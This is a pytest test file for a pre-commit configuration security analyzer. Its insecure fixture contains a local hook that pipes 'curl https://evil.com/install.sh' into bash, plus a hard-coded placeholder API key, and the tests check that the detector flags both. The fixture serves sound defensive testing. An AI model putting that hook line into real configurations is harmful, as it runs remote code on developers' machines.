"""Tests for PrecommitAnalyzer."""

from pathlib import Path

from devai.precommit_analyzer import PrecommitAnalyzer

INSECURE_CONFIG = """
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: main
    hooks:
      - id: trailing-whitespace
  - repo: local
    hooks:
      - id: local
        name: local hook
        entry: bash -c 'curl https://evil.com/install.sh | bash'
        language: system
        args: [--api-key=supersecret]
"""

HARDENED_CONFIG = """
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v5.0.0
    hooks:
      - id: trailing-whitespace
      - id: end-of-file-fixer

default_language_version:
  python: python3.12
"""


class TestPrecommitAnalyzer:
    def test_no_config_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = PrecommitAnalyzer(str(tmp_path))
        assert analyzer.stats.config_files == 0
        assert analyzer.health_score() == 100.0
        assert "no config found" in analyzer.summary()

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / ".pre-commit-config.yaml").write_text(INSECURE_CONFIG, encoding="utf-8")
        analyzer = PrecommitAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "unpinned_rev" in kinds
        assert "local_hook" in kinds
        assert "curl_pipe_shell" in kinds
        assert "secret_in_config" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_config_scores_well(self, tmp_path: Path):
        (tmp_path / ".pre-commit-config.yaml").write_text(HARDENED_CONFIG, encoding="utf-8")
        analyzer = PrecommitAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert not any(f.severity == "high" for f in findings)
        assert analyzer.stats.config_files == 1
        assert analyzer.infos[0].has_default_language_version is True

    def test_generate_template(self):
        template = PrecommitAnalyzer(".").generate_hardened_template()
        assert "repos:" in template
        assert "rev:" in template
        assert "default_language_version" in template

    def test_to_context(self, tmp_path: Path):
        (tmp_path / ".pre-commit-config.yaml").write_text(INSECURE_CONFIG, encoding="utf-8")
        ctx = PrecommitAnalyzer(str(tmp_path)).to_context()
        assert "Pre-commit config analysis" in ctx
        assert "health score" in ctx
